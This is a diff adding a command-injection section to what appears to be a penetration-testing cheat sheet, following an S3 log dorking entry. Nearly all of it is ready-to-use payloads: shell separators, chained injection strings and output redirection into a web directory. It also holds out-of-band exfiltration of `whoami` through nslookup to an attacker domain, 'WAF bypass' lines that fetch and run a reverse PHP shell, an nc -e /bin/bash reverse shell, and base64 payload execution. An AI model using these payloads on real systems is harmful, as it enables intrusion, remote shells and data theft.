@@ -457,3 +457,70 @@ S3 Log Google Dorking
 ```
 s3 site:amazonaws.com filetype:log
 ```
+
+# Web Applications:
+
+## Command Injection:
+
+Special Characters
+
+```
+&
+;
+Newline (0x0a or \n)
+&&
+|
+||
+command `
+$(command )
+```
+
+Useful Commands: Linux
+
+```
+whoami
+ifconfig
+ls
+uname -a
+```
+
+Useful Commands: Windows
+
+```
+whoami
+ipconfig
+dir
+ver
+```
+
+Both Unix and Windows
+
+```
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&&id; ls &&id; ls&& id; ls && id 
+ls&id; ls &id; ls& id; ls & id 
+ls %0A id
+```
+
+Time Delay Commands
+```
+& ping -c 10 127.0.0.1 &
+```
+
+Redirecting Output
+```
+& whoami > /var/www/images/output.txt &
+```
+OOB (Out Of Band) Exploitation
+```
+& nslookup attacker-server.com &
+& nslookup `whoami`.attacker-server.com &
+```
+WAF Bypasses
+```
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
+/tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
+vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+```
